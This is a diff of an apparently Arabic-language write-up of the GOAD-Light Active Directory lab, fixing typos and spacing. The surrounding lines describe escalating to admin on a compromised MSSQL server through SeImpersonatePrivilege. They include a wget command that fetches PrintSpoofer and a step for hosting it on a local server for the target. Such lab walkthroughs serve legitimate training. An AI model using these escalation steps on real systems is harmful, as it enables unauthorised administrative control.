@@ -16,6 +16,7 @@ tags:
   - Detection Engineering
   - Traffic Analysis
 ---
+
 {% include arabic-btn.html %}
 
 # المقدمة
@@ -1418,9 +1419,9 @@ Now we have full administrative access on the MSSQL server.
 ودخلنا وعندنا **impersonation**.
 ![](/Assets/images/GOAD-Light/Whoami%20all.png)
 
-ممكن نأبيوز البريفلج ذي ونجيب فيها ادمن**SeImpersonatePrivilege** بإستخدام وحده من البطاطسات 🥔 [**Potato**](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) أو [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer).
+ممكن نأبيوز البريفلج ذي ونجيب فيها ادمن **SeImpersonatePrivilege** بإستخدام وحده من البطاطسات 🥔 [**Potato**](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) أو [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer).
 ``` bash
-# Terminal 1: من حهازك كمهاجم
+# Terminal 1: من جهازك كمهاجم
 wget -O Pspoofy.exe "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
 
 # Terminal 2: شغل موقع لوكال ببايثون في نفس الدايركتوري اللي حملت فيه التول
